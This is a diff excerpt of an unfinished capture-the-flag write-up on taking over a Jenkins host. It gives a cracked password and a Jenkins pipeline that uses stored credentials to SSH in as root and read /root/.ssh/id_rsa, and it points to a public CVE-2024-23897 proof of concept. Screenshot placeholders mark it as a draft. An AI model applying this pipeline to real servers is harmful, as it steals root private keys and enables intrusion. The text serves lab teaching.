@@ -214,9 +214,48 @@ As expected, we found the same file in the same location. The developer didn' t 
 
 We can decipher the password quickly with John the Ripper:
 
+(insert command johntheripper and screenshot)
+(pic23, pending to do the screenshot)
 
-Let's try to get the same file from our target Jenkins Docker host. Open a terminal and type:
+The password is princess.
 
+### Privilege Escalation
+
+Hold on! So we have the user `jennifer` and the password `princess`. We could try:
+
+1. Log in the platform with user and password
+2. Create a reverse shell and use sudo-su
+
+`jenkins-cli.jar` cannot make effective sudo-su commands. Let's try loggin in the platform.
+
+(pic24)
+
+(pic25)
+
+We are in! Access "jennifer", "Credentials". You will see access to the `root` system through ssh.
+
+(pic26)
+
+
+
+
+```
+pipeline {
+    agent any
+    stages {
+        stage('SSH') {
+            steps {
+                script {
+                    sshagent(credentials: ['1']) {
+                        sh 'ssh -o StrictHostKeyChecking=no root@10.10.11.10
+"cat /root/.ssh/id_rsa"'
+                    }
+                }
+            }
+        }
+    }
+}
+```
 
 
 ?Nonetheless, we don' t find any example of how to implement it. So let's look on Google " CVE-2024-23897 proof of concept" and you will find the following site: https://github.com/3yujw7njai/CVE-2024-23897?
